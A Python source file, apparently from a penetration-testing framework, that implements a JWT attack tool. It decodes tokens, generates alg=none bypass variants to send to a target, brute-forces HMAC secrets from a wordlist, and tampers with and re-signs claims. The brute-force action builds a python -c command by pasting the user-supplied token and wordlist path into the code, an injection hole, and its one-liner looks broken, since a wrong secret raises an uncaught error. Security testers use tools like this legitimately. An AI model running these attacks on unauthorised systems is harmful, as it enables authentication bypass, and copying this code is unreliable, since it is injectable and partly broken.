"""JWT analysis tool — decode, algorithm confusion, key brute, claim manipulation."""

from __future__ import annotations

import asyncio
import base64
import json
import logging
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)


def _b64_decode(data: str) -> str:
    """Decode base64url without padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data).decode("utf-8", errors="replace")


class JwtTool(BasePentestTool):
    """JWT analysis — decode, algorithm confusion, key brute force."""

    name = "jwt_tool"
    description = (
        "JWT analysis — decode tokens, detect algorithm confusion, brute-force weak secrets, manipulate claims."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "jwt_decode": {
            "cmd": [],  # Pure Python — no subprocess needed
            "timeout": 5,
            "description": "Decode a JWT and display header, payload, signature",
        },
        "jwt_alg_none": {
            "cmd": [],  # Pure Python
            "timeout": 5,
            "description": "Test algorithm=none bypass",
        },
        "jwt_crack": {
            "cmd": [
                "python3",
                "-c",
                "import jwt,sys; "
                "[print(f'FOUND: {{w}}') or sys.exit(0) "
                "for w in open('{wordlist}').read().splitlines() "
                "if (lambda t,s: (jwt.decode(t,s,algorithms=['HS256','HS384','HS512']) and True) "
                "if not isinstance((r:=None),Exception) else False)('{token}',w)]",
            ],
            "timeout": 300,
            "description": "Brute-force JWT HMAC secret with wordlist",
        },
        "jwt_tamper": {
            "cmd": [],  # Pure Python
            "timeout": 5,
            "description": "Modify JWT claims and re-sign (for testing)",
        },
    }

    async def execute(
        self,
        action: str,
        token: str = "",
        wordlist: str = "",
        claims: str = "",
        secret: str = "",
        timeout: int = 300,
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        if action == "jwt_decode":
            return self._decode_jwt(token)
        elif action == "jwt_alg_none":
            return self._test_alg_none(token)
        elif action == "jwt_tamper":
            return self._tamper_jwt(token, claims, secret)
        elif action == "jwt_crack":
            if not wordlist:
                return "Error: wordlist parameter required for jwt_crack"
            spec = self.ACTIONS[action]
            cmd = [c.format(token=token, wordlist=wordlist) for c in spec["cmd"]]
            return await self._run(
                action=action,
                cmd=cmd,
                timeout=spec["timeout"],
                target_hint="jwt",
            )

        return f"Unknown action: {action}"

    def _decode_jwt(self, token: str) -> str:
        """Decode and display JWT parts."""
        parts = token.split(".")
        if len(parts) != 3:
            return f"Error: Invalid JWT format (expected 3 parts, got {len(parts)})"

        try:
            header = json.loads(_b64_decode(parts[0]))
            payload = json.loads(_b64_decode(parts[1]))
        except (json.JSONDecodeError, Exception) as e:
            return f"Error decoding JWT: {e}"

        result = {
            "header": header,
            "payload": payload,
            "signature": parts[2][:20] + "..." if len(parts[2]) > 20 else parts[2],
            "analysis": [],
        }

        # Security analysis
        alg = header.get("alg", "")
        if alg == "none":
            result["analysis"].append("⚠️ CRITICAL: Algorithm is 'none' — signature not verified")
        elif alg in ("HS256", "HS384", "HS512"):
            result["analysis"].append(f"Algorithm: {alg} (HMAC) — shared secret, brute-forceable")
        elif alg in ("RS256", "RS384", "RS512"):
            result["analysis"].append(f"Algorithm: {alg} (RSA) — check for algorithm confusion")
        elif alg in ("ES256", "ES384", "ES512"):
            result["analysis"].append(f"Algorithm: {alg} (ECDSA)")

        if "kid" in header:
            result["analysis"].append(f"Key ID (kid): {header['kid']} — check for injection")
        if "jku" in header:
            result["analysis"].append(f"⚠️ JKU header present: {header['jku']} — potential SSRF")
        if "x5u" in header:
            result["analysis"].append(f"⚠️ X5U header present: {header['x5u']} — potential SSRF")

        import time

        exp = payload.get("exp")
        if exp and isinstance(exp, (int, float)):
            if exp < time.time():
                result["analysis"].append("⚠️ Token is EXPIRED")
            else:
                remaining = int(exp - time.time())
                result["analysis"].append(f"Expires in: {remaining}s")

        return json.dumps(result, indent=2)

    def _test_alg_none(self, token: str) -> str:
        """Generate tokens with algorithm=none for bypass testing."""
        parts = token.split(".")
        if len(parts) != 3:
            return "Error: Invalid JWT format"

        try:
            header = json.loads(_b64_decode(parts[0]))
            payload_raw = parts[1]
        except Exception as e:
            return f"Error: {e}"

        # Generate variants with none algorithm
        variants = []
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            new_header = {**header, "alg": alg_val}
            header_b64 = (
                base64.urlsafe_b64encode(json.dumps(new_header, separators=(",", ":")).encode()).rstrip(b"=").decode()
            )
            # Empty signature
            variants.append(f"{header_b64}.{payload_raw}.")

        return json.dumps(
            {
                "original_algorithm": header.get("alg", "unknown"),
                "bypass_tokens": variants,
                "note": "Send each variant to the target — if any are accepted, the server is vulnerable to algorithm=none bypass",
            },
            indent=2,
        )

    def _tamper_jwt(self, token: str, claims_json: str, secret: str) -> str:
        """Modify claims and re-sign with provided secret."""
        parts = token.split(".")
        if len(parts) != 3:
            return "Error: Invalid JWT format"

        try:
            header = json.loads(_b64_decode(parts[0]))
            payload = json.loads(_b64_decode(parts[1]))
            new_claims = json.loads(claims_json) if claims_json else {}
        except (json.JSONDecodeError, Exception) as e:
            return f"Error: {e}"

        payload.update(new_claims)

        # Re-encode
        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
        payload_b64 = (
            base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
        )

        if secret:
            import hmac
            import hashlib

            alg = header.get("alg", "HS256")
            hash_func = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }.get(alg, hashlib.sha256)
            sig = hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hash_func).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        else:
            sig_b64 = ""

        tampered = f"{header_b64}.{payload_b64}.{sig_b64}"
        return json.dumps(
            {
                "tampered_token": tampered,
                "modified_claims": new_claims,
                "signed_with": "provided secret" if secret else "no signature (alg=none style)",
            },
            indent=2,
        )
